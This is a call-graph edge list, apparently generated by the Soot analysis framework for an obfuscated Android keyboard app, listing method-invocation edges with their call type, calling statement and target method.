SPECIAL edge: specialinvoke r0.<ljf: void q(int)>($i4) in <ljf: int o(int,int,int,int)> ==> <ljf: void q(int)>
STATIC edge: $z0 = staticinvoke <java.util.Arrays: boolean equals(short[],short[])>($r6, $r7) in <j$.util.Objects: boolean deepEquals(java.lang.Object,java.lang.Object)> ==> <java.util.Arrays: boolean equals(short[],short[])>
SPECIAL edge: specialinvoke $r4.<java.io.ObjectStreamField: void <init>(java.lang.String,java.lang.Class)>("segmentMask", $r2) in <j$.util.concurrent.ConcurrentHashMap: void <clinit>()> ==> <java.io.ObjectStreamField: void <init>(java.lang.String,java.lang.Class)>
SPECIAL edge: specialinvoke $r0.<dwx: void <init>(int)>(11) in <dwx: void <clinit>()> ==> <dwx: void <init>(int)>
CLINIT edge: staticinvoke <lvt: void <clinit>()>() in <dummyMainClass: void dummyMainMethod(java.lang.String[])> ==> <lvt: void <clinit>()>
VIRTUAL edge: $r15 = virtualinvoke $r13.<lvq: java.lang.Object c(int)>($i7) in <lvr: void <init>(lvr,lvr)> ==> <lvq: java.lang.Object c(int)>
INTERFACE edge: $z0 = interfaceinvoke $r10.<java.util.Iterator: boolean hasNext()>() in <hbv: void j()> ==> <llg: boolean hasNext()>
SPECIAL edge: specialinvoke r0.<qj: void <init>()>() in <qc: void <init>()> ==> <qj: void <init>()>
VIRTUAL edge: $r1 = virtualinvoke $r2.<ljd: java.util.Iterator l()>() in <liy: java.util.Iterator iterator()> ==> <ljd: java.util.Iterator l()>
SPECIAL edge: specialinvoke r0.<ljd: void A(int)>($i4) in <ljd: int z(int,int,int,int)> ==> <ljd: void A(int)>
SPECIAL edge: specialinvoke $r1.<lqm: void <init>(lqn)>(r0) in <lqn: lkq f()> ==> <lqm: void <init>(lqn)>
SPECIAL edge: specialinvoke $r0.<hbw: void <init>(int)>(18) in <hbw: void <clinit>()> ==> <hbw: void <init>(int)>
SPECIAL edge: specialinvoke $r3.<java.lang.StringBuilder: void <init>()>() in <luk: lum a(java.lang.String[])> ==> <java.lang.StringBuilder: void <init>()>
VIRTUAL edge: $r0 = virtualinvoke $r0.<java.lang.String: java.lang.String replace(char,char)>(47, 46) in <lsh: lsh j(java.lang.String)> ==> <java.lang.String: java.lang.String replace(char,char)>
SPECIAL edge: specialinvoke $r0.<lte: void <init>()>() in <ltf: void <clinit>()> ==> <lte: void <init>()>
STATIC edge: $r3 = staticinvoke <java.lang.Class: java.lang.Class forName(java.lang.String)>($r2) in <lwf: void <clinit>()> ==> <java.lang.Class: java.lang.Class forName(java.lang.String)>
VIRTUAL edge: $z0 = virtualinvoke $r3.<java.lang.String: boolean equals(java.lang.Object)>($r4) in <ivw: boolean equals(java.lang.Object)> ==> <java.lang.String: boolean equals(java.lang.Object)>
CLINIT edge: staticinvoke <lsh: void <clinit>()>() in <dummyMainClass: void dummyMainMethod(java.lang.String[])> ==> <lsh: void <clinit>()>
SPECIAL edge: specialinvoke $r7.<mag: void <init>(java.lang.String,int,int)>("TENOR_GIF_THUMBNAIL", 7, 7) in <mag: void <clinit>()> ==> <mag: void <init>(java.lang.String,int,int)>
VIRTUAL edge: $z0 = virtualinvoke $r4.<nzh: boolean e()>() in <ivv: ivw b(java.lang.String)> ==> <nzh: boolean e()>
SPECIAL edge: specialinvoke $r11.<java.lang.IllegalStateException: void <init>(java.lang.String)>($r4) in <luk: lum a(java.lang.String[])> ==> <java.lang.IllegalStateException: void <init>(java.lang.String)>
STATIC edge: staticinvoke <lvm: java.lang.Object g(java.lang.Object,java.lang.String)>($r1, "metadata value") in <lsn: void q(lsz,java.lang.Object)> ==> <lvm: java.lang.Object g(java.lang.Object,java.lang.String)>
VIRTUAL edge: $i1 = virtualinvoke $r1.<java.lang.Object: int hashCode()>() in <lqq: java.lang.Object t(java.lang.Object,java.lang.Object[],int,int,java.lang.Object)> ==> <java.util.AbstractSet: int hashCode()>
SPECIAL edge: specialinvoke $r0.<java.lang.RuntimeException: void <init>(java.lang.String)>("Stub!") in <java.lang.Object: java.lang.Object clone()> ==> <java.lang.RuntimeException: void <init>(java.lang.String)>
SPECIAL edge: specialinvoke r0.<lsc: void <init>(lto)>($r1) in <lsh: void <init>(lto)> ==> <lsc: void <init>(lto)>
SPECIAL edge: specialinvoke $r1.<java.lang.IllegalArgumentException: void <init>(java.lang.String)>($r0) in <iye: void D(boolean,java.lang.String,int,int)> ==> <java.lang.IllegalArgumentException: void <init>(java.lang.String)>
VIRTUAL edge: $r1 = virtualinvoke $r2.<lkx: java.lang.Object get(java.lang.Object)>($r1) in <lme: lma d(java.lang.Object)> ==> <lqq: java.lang.Object get(java.lang.Object)>
STATIC edge: staticinvoke <iej: void g(java.lang.String,iec)>("InputMethodEntryManager_UserUnlocked", $r2) in <hnt: void <clinit>()> ==> <iej: void g(java.lang.String,iec)>
SPECIAL edge: specialinvoke $r8.<java.lang.IllegalArgumentException: void <init>(java.lang.String)>($r2) in <iej: void g(java.lang.String,iec)> ==> <java.lang.IllegalArgumentException: void <init>(java.lang.String)>
VIRTUAL edge: $r3 = virtualinvoke r0.<ljd: int[] w()>() in <ljd: int f(java.lang.Object)> ==> <ljd: int[] w()>
SPECIAL edge: specialinvoke $r0.<lqc: void <init>()>() in <lqc: void <clinit>()> ==> <lqc: void <init>()>
VIRTUAL edge: $i0 = virtualinvoke r0.<lmo: int a(java.lang.Object,java.lang.Object)>($r8, $r3) in <lqs: boolean containsAll(java.util.Collection)> ==> <lmo: int a(java.lang.Object,java.lang.Object)>
STATIC edge: $i2 = staticinvoke <izw: int ag(int,int,int)>($i2, 0, $i1) in <ljf: void j(int,java.lang.Object,int,int)> ==> <izw: int ag(int,int,int)>
INTERFACE edge: $r3 = interfaceinvoke $r7.<java.util.Iterator: java.lang.Object next()>() in <lmb: lme f()> ==> <liz: java.lang.Object next()>
VIRTUAL edge: $l1 = virtualinvoke $r3.<j$.sun.misc.b: long j(java.lang.Class,java.lang.String)>(class "Lj$/util/concurrent/ConcurrentHashMap;", "baseCount") in <j$.util.concurrent.ConcurrentHashMap: void <clinit>()> ==> <j$.sun.misc.b: long j(java.lang.Class,java.lang.String)>
SPECIAL edge: specialinvoke r0.<java.lang.Object: void <init>()>() in <coo: void <init>(int)> ==> <java.lang.Object: void <init>()>
SPECIAL edge: specialinvoke $r30.<hfd: void <init>(axu,java.lang.Class,ldp)>($r20, class "Ljava/nio/ByteBuffer;", $r19) in <hbw: java.lang.Object a(java.lang.Object)> ==> <hfd: void <init>(axu,java.lang.Class,ldp)>
VIRTUAL edge: $r7 = virtualinvoke $r9.<java.lang.StringBuilder: java.lang.String toString()>() in <ivv: ivw b(java.lang.String)> ==> <java.lang.StringBuilder: java.lang.String toString()>
STATIC edge: $r3 = staticinvoke <lkq: lkq A(java.util.Comparator,java.lang.Iterable)>($r5, $r2) in <lmb: lme f()> ==> <lkq: lkq A(java.util.Comparator,java.lang.Iterable)>
STATIC edge: $r0 = staticinvoke <lsh: lsh j(java.lang.String)>("com/google/android/apps/inputmethod/latin/LatinApp") in <com.google.android.apps.inputmethod.latin.LatinApp: void <clinit>()> ==> <lsh: lsh j(java.lang.String)>
VIRTUAL edge: $i1 = virtualinvoke $r1.<java.lang.Object: int hashCode()>() in <lqq: java.lang.Object t(java.lang.Object,java.lang.Object[],int,int,java.lang.Object)> ==> <lma: int hashCode()>
STATIC edge: $r0 = staticinvoke <lsz: lsz c(java.lang.String,java.lang.Class)>("stack_size", class "Lltc;") in <lsl: void <clinit>()> ==> <lsz: lsz c(java.lang.String,java.lang.Class)>
STATIC edge: staticinvoke <lsc: void f(java.lang.String,ltn)>($r3, r0) in <lsn: void ab(java.lang.String,java.lang.Object[])> ==> <lsc: void f(java.lang.String,ltn)>
CLINIT edge: staticinvoke <hef: void <clinit>()>() in <dummyMainClass: void dummyMainMethod(java.lang.String[])> ==> <hef: void <clinit>()>
SPECIAL edge: specialinvoke r0.<ivv: void <init>()>() in <ivv: void <init>(byte[])> ==> <ivv: void <init>()>
SPECIAL edge: specialinvoke $r17.<mag: void <init>(java.lang.String,int,int)>("EXPRESSIVE_STICKER_AUTOCOMPLETE", 17, 17) in <mag: void <clinit>()> ==> <mag: void <init>(java.lang.String,int,int)>
VIRTUAL edge: $i0 = virtualinvoke $r2.<lts: int b()>() in <lsd: boolean b(lsr)> ==> <ltr: int b()>
STATIC edge: $i0 = staticinvoke <lkg: int a(int,int)>($i0, $i1) in <lkt: void e(int)> ==> <lkg: int a(int,int)>
SPECIAL edge: specialinvoke $r0.<jlu: void <init>(int)>(7) in <jlu: void <clinit>()> ==> <jlu: void <init>(int)>
VIRTUAL edge: $i0 = virtualinvoke r0.<ljd: int size()>() in <ljd: boolean isEmpty()> ==> <ljd: int size()>
VIRTUAL edge: $i0 = virtualinvoke r0.<qj: int b(java.lang.Object)>($r2) in <qj: java.lang.Object get(java.lang.Object)> ==> <qj: int b(java.lang.Object)>
SPECIAL edge: $r4 = specialinvoke r0.<ljf: java.lang.Object[] s()>() in <ljf: boolean add(java.lang.Object)> ==> <ljf: java.lang.Object[] s()>
VIRTUAL edge: virtualinvoke $r1.<java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>($r2) in <ivv: java.lang.String c()> ==> <java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>
VIRTUAL edge: $r3 = virtualinvoke $r1.<lsz: java.lang.Object d(java.lang.Object)>($r3) in <lsm: java.lang.Object d(lsz)> ==> <lsz: java.lang.Object d(java.lang.Object)>
SPECIAL edge: $z0 = specialinvoke r0.<lmo: boolean containsAll(java.util.Collection)>($r10) in <lqs: boolean containsAll(java.util.Collection)> ==> <java.util.AbstractCollection: boolean containsAll(java.util.Collection)>
SPECIAL edge: specialinvoke r0.<lkg: void g(int)>($i0) in <lkg: void c(java.lang.Object)> ==> <lkg: void g(int)>
SPECIAL edge: specialinvoke $r0.<dwx: void <init>(int)>(18) in <dwx: void <clinit>()> ==> <dwx: void <init>(int)>
SPECIAL edge: specialinvoke $r6.<j$.util.concurrent.c: void <init>(long)>($l0) in <j$.util.concurrent.ConcurrentHashMap: void a(long,int)> ==> <j$.util.concurrent.c: void <init>(long)>
VIRTUAL edge: $i0 = virtualinvoke $r0.<java.lang.String: int length()>() in <ivw: boolean z(java.lang.String)> ==> <java.lang.String: int length()>
VIRTUAL edge: $i0 = virtualinvoke $r2.<ljd: int d(int)>($i0) in <liz: java.lang.Object next()> ==> <ljd: int d(int)>
VIRTUAL edge: virtualinvoke $r9.<java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>($r2) in <iej: void g(java.lang.String,iec)> ==> <java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>
SPECIAL edge: specialinvoke $r0.<dwx: void <init>(int)>(3) in <dwx: void <clinit>()> ==> <dwx: void <init>(int)>
INTERFACE edge: $r7 = interfaceinvoke $r3.<java.util.Map: java.util.Set entrySet()>() in <j$.util.concurrent.ConcurrentHashMap: boolean equals(java.lang.Object)> ==> <j$.util.concurrent.ConcurrentHashMap: java.util.Set entrySet()>
SPECIAL edge: specialinvoke $r1.<android.view.View: void <init>(android.content.Context)>(null) in <dummyMainClass: androidx.core.content.FileProvider dummyMainMethod_androidx_core_content_FileProvider(android.content.Intent)> ==> <android.view.View: void <init>(android.content.Context)>
STATIC edge: $r0 = staticinvoke <j$.util.concurrent.r: j$.util.concurrent.s g(j$.util.concurrent.s,j$.util.concurrent.s)>($r0, $r3) in <j$.util.concurrent.r: j$.util.concurrent.s c(j$.util.concurrent.s,j$.util.concurrent.s)> ==> <j$.util.concurrent.r: j$.util.concurrent.s g(j$.util.concurrent.s,j$.util.concurrent.s)>
SPECIAL edge: specialinvoke r0.<java.lang.Object: void <init>()>() in <lig: void <init>()> ==> <java.lang.Object: void <init>()>
SPECIAL edge: specialinvoke r0.<j$.util.concurrent.ConcurrentHashMap: void o(j$.util.concurrent.l[],j$.util.concurrent.l[])>($r1, null) in <j$.util.concurrent.ConcurrentHashMap: void q(int)> ==> <j$.util.concurrent.ConcurrentHashMap: void o(j$.util.concurrent.l[],j$.util.concurrent.l[])>
VIRTUAL edge: $r10 = virtualinvoke $r9.<lma: lsa l()>() in <hbv: void j()> ==> <lqs: lsa l()>
STATIC edge: $z0 = staticinvoke <lvr: boolean e(int,int)>($i1, $i0) in <lvr: void <init>(lvr,lvr)> ==> <lvr: boolean e(int,int)>
INTERFACE edge: $i0 = interfaceinvoke $r2.<java.util.Set: int size()>() in <lri: boolean j(java.util.Set,java.lang.Object)> ==> <lrg: int size()>
VIRTUAL edge: $z0 = virtualinvoke $r2.<java.lang.Object: boolean equals(java.lang.Object)>($r5) in <lqq: java.lang.Object u(java.lang.Object[],int,int,int)> ==> <lkq: boolean equals(java.lang.Object)>
STATIC edge: staticinvoke <java.lang.System: void arraycopy(java.lang.Object,int,java.lang.Object,int,int)>($r1, 0, $r2, $i1, $i0) in <lqr: int b(java.lang.Object[],int)> ==> <java.lang.System: void arraycopy(java.lang.Object,int,java.lang.Object,int,int)>
VIRTUAL edge: $z0 = virtualinvoke $r2.<java.lang.Object: boolean equals(java.lang.Object)>($r5) in <lqq: java.lang.Object u(java.lang.Object[],int,int,int)> ==> <java.util.AbstractSet: boolean equals(java.lang.Object)>
STATIC edge: $i2 = staticinvoke <izw: int ac(int)>($i0) in <lly: void j(java.lang.Object)> ==> <izw: int ac(int)>
STATIC edge: $r2 = staticinvoke <java.util.Arrays: java.lang.Object[] copyOf(java.lang.Object[],int)>($r2, $i0) in <lly: lma g()> ==> <java.util.Arrays: java.lang.Object[] copyOf(java.lang.Object[],int)>
VIRTUAL edge: $z0 = virtualinvoke $r1.<java.lang.Object: boolean equals(java.lang.Object)>($r2) in <lqq: java.lang.Object t(java.lang.Object,java.lang.Object[],int,int,java.lang.Object)> ==> <lqs: boolean equals(java.lang.Object)>
SPECIAL edge: specialinvoke $r2.<ltc: void <init>(java.lang.String,int,int)>("MEDIUM", 1, 20) in <ltc: void <clinit>()> ==> <ltc: void <init>(java.lang.String,int,int)>
STATIC edge: $r1 = staticinvoke <idq: idq a(java.lang.String,mag)>("CuratedImage", $r0) in <idq: void <clinit>()> ==> <idq: idq a(java.lang.String,mag)>
VIRTUAL edge: virtualinvoke $r7.<java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>("Incomplete privateUse subtag, error index: ") in <nzh: boolean f(ivv)> ==> <java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>
VIRTUAL edge: $l3 = virtualinvoke $r17.<java.util.concurrent.atomic.AtomicLong: long getAndIncrement()>() in <lsd: boolean b(lsr)> ==> <java.util.concurrent.atomic.AtomicLong: long getAndIncrement()>
VIRTUAL edge: virtualinvoke $r0.<java.lang.StringBuilder: java.lang.StringBuilder append(char)>(58) in <lsc: void f(java.lang.String,ltn)> ==> <java.lang.StringBuilder: java.lang.StringBuilder append(char)>
SPECIAL edge: specialinvoke $r0.<java.lang.RuntimeException: void <init>(java.lang.String)>("Stub!") in <java.lang.String: int indexOf(java.lang.String,int)> ==> <java.lang.RuntimeException: void <init>(java.lang.String)>
VIRTUAL edge: virtualinvoke $r1.<java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>($r2) in <ivv: java.lang.String c()> ==> <java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>
SPECIAL edge: specialinvoke $r1.<her: void <init>(miy)>($r0) in <her: her k(miy)> ==> <her: void <init>(miy)>
STATIC edge: $r5 = staticinvoke <ivw: java.lang.String[] Q(java.util.List)>($r4) in <ivw: void <init>(ivv,java.lang.String)> ==> <ivw: java.lang.String[] Q(java.util.List)>
STATIC edge: $i1 = staticinvoke <izw: int ac(int)>($i1) in <lqq: java.lang.Object t(java.lang.Object,java.lang.Object[],int,int,java.lang.Object)> ==> <izw: int ac(int)>
VIRTUAL edge: $r3 = virtualinvoke r0.<ljd: int[] w()>() in <ljd: void r(int,java.lang.Object,java.lang.Object,int,int)> ==> <ljd: int[] w()>
SPECIAL edge: specialinvoke $r4.<java.lang.IllegalArgumentException: void <init>(java.lang.String)>("identifier must not be empty") in <lsz: void <init>(java.lang.String,java.lang.Class,boolean,boolean)> ==> <java.lang.IllegalArgumentException: void <init>(java.lang.String)>
VIRTUAL edge: $z2 = virtualinvoke $r2.<j$.sun.misc.b: boolean d(java.lang.Object,long,long,long)>(r0, $l3, $l4, $l5) in <j$.util.concurrent.ConcurrentHashMap: void a(long,int)> ==> <j$.sun.misc.b: boolean d(java.lang.Object,long,long,long)>
SPECIAL edge: $r5 = specialinvoke r0.<ljf: java.lang.Object p()>() in <ljf: boolean add(java.lang.Object)> ==> <ljf: java.lang.Object p()>
SPECIAL edge: $i5 = specialinvoke r0.<ljf: int o(int,int,int,int)>($i4, $i5, $i3, $i0) in <ljf: boolean add(java.lang.Object)> ==> <ljf: int o(int,int,int,int)>
VIRTUAL edge: $z0 = virtualinvoke $r2.<j$.sun.misc.b: boolean c(java.lang.Object,long,int,int)>(r0, $l0, $i1, $i2) in <j$.util.concurrent.ConcurrentHashMap: void a(long,int)> ==> <j$.sun.misc.b: boolean c(java.lang.Object,long,int,int)>
STATIC edge: $r0 = staticinvoke <java.lang.Runtime: java.lang.Runtime getRuntime()>() in <j$.util.concurrent.ConcurrentHashMap: void <clinit>()> ==> <java.lang.Runtime: java.lang.Runtime getRuntime()>
STATIC edge: $i1 = staticinvoke <izw: int ac(int)>($i1) in <lqq: java.lang.Object t(java.lang.Object,java.lang.Object[],int,int,java.lang.Object)> ==> <izw: int ac(int)>
CLINIT edge: staticinvoke <java.lang.Character$UnicodeBlock: void <clinit>()>() in <dummyMainClass: void dummyMainMethod(java.lang.String[])> ==> <java.lang.Character$UnicodeBlock: void <clinit>()>
VIRTUAL edge: $z0 = virtualinvoke $r2.<java.lang.Object: boolean equals(java.lang.Object)>($r5) in <lqq: java.lang.Object u(java.lang.Object[],int,int,int)> ==> <java.util.AbstractSet: boolean equals(java.lang.Object)>
CLINIT edge: staticinvoke <androidx.core.content.FileProvider: void <clinit>()>() in <dummyMainClass: void dummyMainMethod(java.lang.String[])> ==> <androidx.core.content.FileProvider: void <clinit>()>
VIRTUAL edge: virtualinvoke $r9.<java.lang.StringBuilder: java.lang.StringBuilder append(int)>($i0) in <ivv: ivw b(java.lang.String)> ==> <java.lang.StringBuilder: java.lang.StringBuilder append(int)>
VIRTUAL edge: $z0 = virtualinvoke $r1.<java.lang.Object: boolean equals(java.lang.Object)>($r2) in <lqq: java.lang.Object t(java.lang.Object,java.lang.Object[],int,int,java.lang.Object)> ==> <lid: boolean equals(java.lang.Object)>
SPECIAL edge: specialinvoke $r0.<lth: void <init>(lto)>($r1) in <lth: lth i(java.lang.String)> ==> <lth: void <init>(lto)>
CLINIT edge: staticinvoke <lsq: void <clinit>()>() in <dummyMainClass: void dummyMainMethod(java.lang.String[])> ==> <lsq: void <clinit>()>
SPECIAL edge: specialinvoke $r6.<j$.util.concurrent.l: void <init>(int,java.lang.Object,java.lang.Object)>($i0, $r1, $r2) in <j$.util.concurrent.ConcurrentHashMap: java.lang.Object g(java.lang.Object,java.lang.Object,boolean)> ==> <j$.util.concurrent.l: void <init>(int,java.lang.Object,java.lang.Object)>
INTERFACE edge: $r11 = interfaceinvoke $r6.<java.util.Map$Entry: java.lang.Object getKey()>() in <hbv: void j()> ==> <lki: java.lang.Object getKey()>
SPECIAL edge: specialinvoke $r0.<hbw: void <init>(int)>(7) in <hbw: void <clinit>()> ==> <hbw: void <init>(int)>
STATIC edge: $r1 = staticinvoke <j$.util.Objects: java.lang.Object requireNonNull(java.lang.Object)>($r1) in <lma: lma i(int,java.lang.Object[])> ==> <j$.util.Objects: java.lang.Object requireNonNull(java.lang.Object)>
VIRTUAL edge: virtualinvoke r0.<lsn: void q(lsz,java.lang.Object)>($r13, $r11) in <lsn: void ab(java.lang.String,java.lang.Object[])> ==> <lsn: void q(lsz,java.lang.Object)>
STATIC edge: $z0 = staticinvoke <android.text.TextUtils: boolean isEmpty(java.lang.CharSequence)>($r1) in <ivv: ivw b(java.lang.String)> ==> <android.text.TextUtils: boolean isEmpty(java.lang.CharSequence)>
STATIC edge: $i0 = staticinvoke <j$.util.concurrent.ConcurrentHashMap: int k(int)>($i0) in <j$.util.concurrent.ConcurrentHashMap: java.lang.Object get(java.lang.Object)> ==> <j$.util.concurrent.ConcurrentHashMap: int k(int)>
SPECIAL edge: specialinvoke $r0.<mag: void <init>(java.lang.String,int,int)>("UNKNOWN_SEARCH_FEATURE", 0, 0) in <mag: void <clinit>()> ==> <mag: void <init>(java.lang.String,int,int)>
VIRTUAL edge: $i6 = virtualinvoke $r2.<java.lang.Object: int hashCode()>() in <lqq: java.lang.Object u(java.lang.Object[],int,int,int)> ==> <java.util.AbstractSet: int hashCode()>
SPECIAL edge: specialinvoke $r0.<hbw: void <init>(int)>(12) in <hbw: void <clinit>()> ==> <hbw: void <init>(int)>
VIRTUAL edge: $r3 = virtualinvoke $r30.<java.lang.StringBuilder: java.lang.String toString()>() in <lsn: void ab(java.lang.String,java.lang.Object[])> ==> <java.lang.StringBuilder: java.lang.String toString()>
VIRTUAL edge: virtualinvoke $r0.<java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>("]: ") in <lsc: void f(java.lang.String,ltn)> ==> <java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>
VIRTUAL edge: $z0 = virtualinvoke $r1.<java.lang.Object: boolean equals(java.lang.Object)>($r5) in <j$.util.concurrent.ConcurrentHashMap: java.lang.Object get(java.lang.Object)> ==> <java.lang.String: boolean equals(java.lang.Object)>
STATIC edge: staticinvoke <iye: void Q(int,int)>($i0, $i1) in <lqq: lqq r(int,java.lang.Object[],lkt)> ==> <iye: void Q(int,int)>
VIRTUAL edge: $r10 = virtualinvoke $r9.<lma: lsa l()>() in <hbv: void j()> ==> <lqo: lsa l()>
STATIC edge: $r0 = staticinvoke <lsh: lsh j(java.lang.String)>("com/google/android/libraries/inputmethod/experiment/FlagFactory") in <hbu: void <clinit>()> ==> <lsh: lsh j(java.lang.String)>
VIRTUAL edge: $z0 = virtualinvoke $r1.<java.lang.Object: boolean equals(java.lang.Object)>($r0) in <ojg: boolean f(java.lang.Object,java.lang.Object)> ==> <java.lang.String: boolean equals(java.lang.Object)>
SPECIAL edge: specialinvoke r0.<java.lang.Error: void <init>()>() in <java.lang.AssertionError: void <init>(java.lang.Object)> ==> <java.lang.Error: void <init>()>
INTERFACE edge: $r2 = interfaceinvoke $r1.<java.util.Collection: java.lang.Object[] toArray()>() in <izw: java.lang.Object[] S(java.lang.Iterable)> ==> <java.util.AbstractCollection: java.lang.Object[] toArray()>
SPECIAL edge: specialinvoke $r0.<coo: void <init>(int)>(15) in <coo: void <clinit>()> ==> <coo: void <init>(int)>
VIRTUAL edge: $z0 = virtualinvoke $r2.<j$.sun.misc.b: boolean d(java.lang.Object,long,long,long)>(r0, $l4, $l5, $l3) in <j$.util.concurrent.ConcurrentHashMap: void a(long,int)> ==> <j$.sun.misc.b: boolean d(java.lang.Object,long,long,long)>
VIRTUAL edge: $r1 = virtualinvoke r0.<lsc: lsw a(java.util.logging.Level)>($r2) in <lsc: lsw d()> ==> <lsh: lsw a(java.util.logging.Level)>
VIRTUAL edge: virtualinvoke r0.<j$.util.concurrent.q: j$.util.concurrent.l c()>() in <j$.util.concurrent.d: java.lang.Object next()> ==> <j$.util.concurrent.q: j$.util.concurrent.l c()>
SPECIAL edge: specialinvoke $r0.<hbw: void <init>(int)>(11) in <hbw: void <clinit>()> ==> <hbw: void <init>(int)>
VIRTUAL edge: $r4 = virtualinvoke $r3.<lma: lsa l()>() in <llg: void <init>(llo)> ==> <lqn: lsa l()>
VIRTUAL edge: $z0 = virtualinvoke $r1.<java.lang.Object: boolean equals(java.lang.Object)>($r2) in <lqq: java.lang.Object t(java.lang.Object,java.lang.Object[],int,int,java.lang.Object)> ==> <java.util.AbstractMap$SimpleImmutableEntry: boolean equals(java.lang.Object)>
STATIC edge: $i5 = staticinvoke <izw: int ah(int)>($i4) in <ljf: boolean add(java.lang.Object)> ==> <izw: int ah(int)>
STATIC edge: $r0 = staticinvoke <lsz: lsz c(java.lang.String,java.lang.Class)>("ratelimit_count", class "Ljava/lang/Integer;") in <lsl: void <clinit>()> ==> <lsz: lsz c(java.lang.String,java.lang.Class)>
SPECIAL edge: specialinvoke r0.<java.lang.Object: void <init>()>() in <jlu: void <init>(int)> ==> <java.lang.Object: void <init>()>
STATIC edge: $z0 = staticinvoke <ivw: boolean B(java.lang.String)>($r2) in <ivv: void f(java.lang.String)> ==> <ivw: boolean B(java.lang.String)>
VIRTUAL edge: $c1 = virtualinvoke $r1.<java.lang.String: char charAt(int)>(0) in <lsz: void <init>(java.lang.String,java.lang.Class,boolean,boolean)> ==> <java.lang.String: char charAt(int)>
SPECIAL edge: specialinvoke r0.<java.lang.Object: void <init>()>() in <lka: void <init>()> ==> <java.lang.Object: void <init>()>
STATIC edge: $r1 = staticinvoke <java.util.Arrays: int[] copyOf(int[],int)>($r1, $i0) in <ljf: void l(int)> ==> <java.util.Arrays: int[] copyOf(int[],int)>
SPECIAL edge: $i0 = specialinvoke r0.<qj: int j()>() in <qj: int b(java.lang.Object)> ==> <qj: int j()>
VIRTUAL edge: $z0 = virtualinvoke $r3.<java.lang.Object: boolean equals(java.lang.Object)>($r1) in <lsm: int a(lsz)> ==> <lta: boolean equals(java.lang.Object)>
VIRTUAL edge: $c2 = virtualinvoke $r0.<java.lang.String: char charAt(int)>($i0) in <ivw: boolean B(java.lang.String)> ==> <java.lang.String: char charAt(int)>
SPECIAL edge: specialinvoke $r0.<coo: void <init>(int)>(18) in <coo: void <clinit>()> ==> <coo: void <init>(int)>
STATIC edge: $i2 = staticinvoke <lma: int e(int)>($i1) in <lma: lma i(int,java.lang.Object[])> ==> <lma: int e(int)>
INTERFACE edge: $z0 = interfaceinvoke $r3.<java.util.List: boolean isEmpty()>() in <ivv: ivw a()> ==> <java.util.ArrayList: boolean isEmpty()>
SPECIAL edge: specialinvoke $r0.<java.lang.RuntimeException: void <init>(java.lang.String)>("Stub!") in <java.lang.String: java.lang.String replace(char,char)> ==> <java.lang.RuntimeException: void <init>(java.lang.String)>
STATIC edge: $i0 = staticinvoke <lma: int e(int)>($i0) in <lly: lma g()> ==> <lma: int e(int)>
STATIC edge: $r0 = staticinvoke <iye: lfa p(lfa)>($r1) in <hfd: void <clinit>()> ==> <iye: lfa p(lfa)>
VIRTUAL edge: $z0 = virtualinvoke r0.<ljf: boolean m()>() in <ljf: boolean add(java.lang.Object)> ==> <ljf: boolean m()>
SPECIAL edge: specialinvoke $r13.<java.lang.NullPointerException: void <init>(java.lang.String)>("Null throw statement replaced by Soot") in <j$.util.concurrent.ConcurrentHashMap: java.lang.Object g(java.lang.Object,java.lang.Object,boolean)> ==> <java.lang.NullPointerException: void <init>(java.lang.String)>
SPECIAL edge: $r3 = specialinvoke r0.<lvr: java.util.Map$Entry d(java.lang.String,int)>($r8, $i0) in <lvr: int a(java.util.Map$Entry,int,int,java.lang.Object[],int[])> ==> <lvr: java.util.Map$Entry d(java.lang.String,int)>
SPECIAL edge: specialinvoke $r3.<java.lang.IllegalStateException: void <init>(java.lang.String)>($r4) in <hbv: void k(java.lang.Object,boolean)> ==> <java.lang.IllegalStateException: void <init>(java.lang.String)>
SPECIAL edge: specialinvoke r0.<lkf: void <init>()>() in <lqk: void <init>()> ==> <lkf: void <init>()>
VIRTUAL edge: $r5 = virtualinvoke $r4.<qj: java.lang.Object put(java.lang.Object,java.lang.Object)>($r2, $r3) in <ivv: ivw i(java.lang.String)> ==> <qj: java.lang.Object put(java.lang.Object,java.lang.Object)>
SPECIAL edge: specialinvoke r0.<java.lang.Object: void <init>()>() in <iec: void <init>()> ==> <java.lang.Object: void <init>()>
VIRTUAL edge: $r3 = virtualinvoke $r1.<ljd: java.lang.Object k(int)>($i0) in <ljb: java.lang.Object getValue()> ==> <ljd: java.lang.Object k(int)>
SPECIAL edge: specialinvoke r0.<java.lang.Object: void <init>()>() in <j$.util.concurrent.p: void <init>()> ==> <java.lang.Object: void <init>()>
VIRTUAL edge: $i1 = virtualinvoke $r1.<java.lang.Object: int hashCode()>() in <lqq: java.lang.Object t(java.lang.Object,java.lang.Object[],int,int,java.lang.Object)> ==> <java.util.AbstractMap$SimpleImmutableEntry: int hashCode()>
SPECIAL edge: specialinvoke $r14.<java.lang.StringBuilder: void <init>()>() in <ivv: ivw b(java.lang.String)> ==> <java.lang.StringBuilder: void <init>()>
STATIC edge: staticinvoke <izw: void an(java.lang.Object,int,int)>($r1, $i5, $i1) in <ljf: int o(int,int,int,int)> ==> <izw: void an(java.lang.Object,int,int)>
INTERFACE edge: $z0 = interfaceinvoke $r2.<java.util.List: boolean isEmpty()>() in <ivv: int h()> ==> <java.util.ArrayList: boolean isEmpty()>
SPECIAL edge: specialinvoke r0.<java.lang.Object: void <init>()>() in <jhe: void <init>(lak,lsr,int,byte[])> ==> <java.lang.Object: void <init>()>
SPECIAL edge: specialinvoke r0.<lwe: void <init>()>() in <lwa: void <init>()> ==> <lwe: void <init>()>
STATIC edge: $i8 = staticinvoke <izw: int af(int,int)>($i2, $i4) in <ljd: java.lang.Object put(java.lang.Object,java.lang.Object)> ==> <izw: int af(int,int)>
CLINIT edge: staticinvoke <java.lang.String: void <clinit>()>() in <dummyMainClass: void dummyMainMethod(java.lang.String[])> ==> <java.lang.String: void <clinit>()>
STATIC edge: $i8 = staticinvoke <izw: int aj(java.lang.Object,int)>($r1, $i3) in <ljf: int o(int,int,int,int)> ==> <izw: int aj(java.lang.Object,int)>
